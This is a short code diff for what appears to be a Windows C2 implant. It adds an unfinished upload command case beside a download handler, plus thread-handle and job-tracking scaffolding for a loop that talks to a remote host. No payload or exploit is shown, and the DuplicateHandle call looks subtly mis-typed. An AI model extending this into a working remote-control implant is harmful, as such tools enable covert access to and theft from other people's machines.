@@ -42,6 +42,12 @@ DWORD WINAPI wrkr_thread(struct new_thread_params_t* params) {
         struct download_req_t* download_req = &download_msg->req;
         implant_download(download_req);
         break;
+    case UPLOAD: {
+        struct upload_msg_t* upload_msg = &msg.upload;
+        struct upload_req_t* upload_req = &upload_msg->req;
+        //implant_upload(upload_req);
+        break;
+    }
     default:
         break;
     }
@@ -71,6 +77,17 @@ int main() {
 
     struct jobs_t jobs;
     memset(&jobs, 0, sizeof(jobs));
+
+    InitializeCriticalSection(&jobs.jobs_cs);
+    DuplicateHandle(
+        GetCurrentProcess(),
+        GetCurrentThread(),
+        GetCurrentProcess(),
+        jobs.main_thread_handle,
+        0,
+        FALSE,
+        DUPLICATE_SAME_ACCESS
+    );
 
     struct addrinfo* raddrinfo = transport_pcb.remote_addrinfo;
     Tremont_Nexus* nexus = transport_pcb.nexus;
@@ -121,6 +138,7 @@ int main() {
                 0,
                 0
             );
+            params->jobs = &jobs;
             track_job(params->self, &jobs);
         }
         default:
